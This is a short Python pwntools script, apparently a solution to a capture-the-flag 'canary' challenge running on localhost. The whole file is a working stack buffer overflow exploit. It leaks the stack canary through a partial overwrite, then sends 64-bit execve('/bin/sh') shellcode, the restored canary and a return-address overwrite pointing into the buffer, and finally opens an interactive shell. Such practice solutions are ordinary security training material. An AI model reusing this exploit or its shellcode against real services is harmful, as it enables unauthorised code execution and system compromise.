from pwn import *

IP = '127.0.0.1'
PORT = 12370

shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05' # 64bit shellcode

p = remote(IP, PORT)

#p = process('./Pwnable/canary/prob/prob')

p.recvuntil(b'buf[50] address: ')


buf_address = p.recvuntil('\n')

print(buf_address)

# stage 1. canary leak

payload = b'\x90' * (0x40 - 0x8)
payload += b'A' # for canary leak

p.send(payload)

p.recvuntil("It's your answer! right? : ")


canary_leak = p.recvuntil('\n')
canary_leak = b'\x00' + canary_leak.split(b'A')[1][:7]
canary_leak = hex(u64(canary_leak))
print("canary : ", canary_leak)

# stage 2. explotation

payload = shellcode
payload += b'\x90' * (0x40 - len(shellcode) - 0x8) # it's strange.. NOP Sled is not working on my laptop
payload += p64(int(canary_leak, 16))
payload += b'\x90' * 8 # sfp
payload += p64(int(buf_address, 16)) # RET Overwrite

#print(p64(int(buf_address, 16)))

p.send(payload)

p.interactive()